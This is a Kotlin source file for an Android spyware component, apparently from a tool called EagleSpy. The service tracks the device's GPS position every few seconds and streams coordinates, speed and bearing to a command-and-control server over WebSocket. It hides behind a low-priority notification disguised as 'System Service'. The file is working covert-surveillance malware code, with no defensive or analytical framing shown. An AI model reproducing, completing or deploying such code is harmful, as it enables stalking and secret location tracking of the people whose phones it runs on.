package com.stealth.eaglespy.services

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.stealth.eaglespy.EagleSpyApp
import com.stealth.eaglespy.webrtc.SignalingClient
import org.json.JSONObject

/**
 * Background Location Service
 * Tracks GPS position and streams to C2 via WebSocket
 */
class LocationService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 2001
        private const val CHANNEL_ID = "location_channel"
        
        // Location update intervals (milliseconds)
        private const val UPDATE_INTERVAL = 10000L // 10 seconds
        private const val FASTEST_INTERVAL = 5000L // 5 seconds
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private var signalingClient: SignalingClient? = null
    private var isStreaming = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        setupLocationCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        when (action) {
            "START_TRACKING" -> startLocationTracking()
            "STOP_TRACKING" -> stopLocationTracking()
            "START_SERVICE" -> startForegroundWithNotification()
        }

        return START_STICKY
    }

    private fun startForegroundWithNotification() {
        val notification = createStealthNotification()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service"
                setShowBadge(false)
            }
            
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    sendLocationToServer(location)
                }
            }
        }
    }

    private fun startLocationTracking() {
        if (isStreaming) return
        
        startForegroundWithNotification()
        
        // Connect to signaling server
        signalingClient = SignalingClient(
            EagleSpyApp.serverUrl,
            EagleSpyApp.deviceId,
            "location"
        )
        signalingClient?.connect()

        // Request location updates
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, UPDATE_INTERVAL)
            .setMinUpdateIntervalMillis(FASTEST_INTERVAL)
            .setWaitForAccurateLocation(true)
            .build()

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            == PackageManager.PERMISSION_GRANTED) {
            
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
            isStreaming = true
        }
    }

    private fun stopLocationTracking() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
        signalingClient?.disconnect()
        isStreaming = false
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    private fun sendLocationToServer(location: Location) {
        val data = JSONObject().apply {
            put("latitude", location.latitude)
            put("longitude", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("bearing", location.bearing)
            put("timestamp", location.time)
            put("provider", location.provider)
        }

        signalingClient?.sendMessage("location_update", data)
    }

    override fun onDestroy() {
        stopLocationTracking()
        super.onDestroy()
    }
}
